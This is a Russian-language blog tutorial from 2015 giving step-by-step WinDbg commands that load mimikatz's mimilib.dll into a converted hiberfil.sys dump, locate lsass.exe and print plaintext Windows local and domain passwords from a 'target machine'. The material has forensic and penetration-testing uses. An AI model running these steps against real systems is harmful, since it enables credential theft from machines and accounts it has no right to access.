---
title: "Восстановливаем локальные и доменные пароли из hiberfil.sys"
date: 2015-02-16
---

Утилита [mimikatz](http://blog.gentilkiwi.com/mimikatz), позволяющая извлекать учётные данные Windows из LSA в открытом виде, существует с 2012 года, однако помимо [хорошо освещённого](http://www.securitylab.ru/news/420431.php) функционала восстановления паролей из памяти работающей ОС у неё есть ещё одна довольно интересная возможность. Далее я приведу пошаговую инструкцию, как при помощи нехитрых действий извлечь учётные данные из файла hiberfil.sys.  
  

###  **Подготовка**

  
Для осуществления задуманного нам понадобятся следующие утилиты:  


  * [Debugging Tools for Windows](https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063(v=vs.85).aspx)
  * [Windows Memory toolkit](http://www.moonsols.com/windows-memory-toolkit/) free edition
  * И, собственно, сам [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest)


###  **Действия**

  


1. Получаем файл hiberfil.sys с целевой машины.

  

2. Конвертируем файл в формат понятный WinDbg

  
**hibr2dmp.exe d:\temp\hiberfil.sys c:\temp\hiberfil.dmp**
**  
**

Процесс может занять довольно продолжительное время

  

![1.jpg]({{ '/images/1.jpg' | absolute_url }})

  

3. Запускаем WinDbg и открываем полученный файл 

  
**File  -**> **Open Crash Dump**

  
4. Настраиваем отладочные символы

  
Открываем **File  ****-** >** ****Symbol File Path… **и вписываем следующую строчку

  
**SRV*c:\symbols*http://msdl.microsoft.com/download/symbols**
**  
**

Вместо c:\symbols, естественно, может быть любой каталог, в который будут загружены символы 

  

![2.png]({{ '/images/2.png' | absolute_url }})

  

В командной строке дебаггера пишем

  

0: kd> **.reload /n**
**  
**

Ждём окончания загрузки символов

  

![1.png]({{ '/images/1.png' | absolute_url }})

  

5. Указываем путь к библиотеке mimilib.dll (находится в каталоге с mimikatz)

  

0: kd> **.load z:\Soft\Security\Passwords\Mimikatz\x64\mimilib.dll**
**  
**

![1.png]({{ '/images/1.png' | absolute_url }})

  

6. Находим адрес процесса lsass.exe

  

0: kd> **!process 0 0 lsass.exe**
**  
**

![1.png]({{ '/images/1.png' | absolute_url }})

  

В данном случае адрес: fffffa800a7d9060

  

7. Переключаем контекст процесса

  

0: kd> **.process /r /p fffffa800a7d9060**
**  
**

![1.png]({{ '/images/1.png' | absolute_url }})

  

8. Запускаем mimikatz и получаем пароли в открытом виде

  

0:kd>** !mimikatz**
**  
**

![1.png]({{ '/images/1.png' | absolute_url }})
**  
**

**  
**

**  
**

###  **Ссылки по теме**

**  
**

Раскрытие учетных данных в Microsoft Windows: **<http://www.securitylab.ru/vulnerability/420418.php>**

LSA Authentication: <https://msdn.microsoft.com/en-us/library/windows/desktop/aa378326(v=vs.85).aspx>

What is Digest Authentication:**<https://technet.microsoft.com/en-us/library/cc778868(WS.10).aspx>**

  

**  
**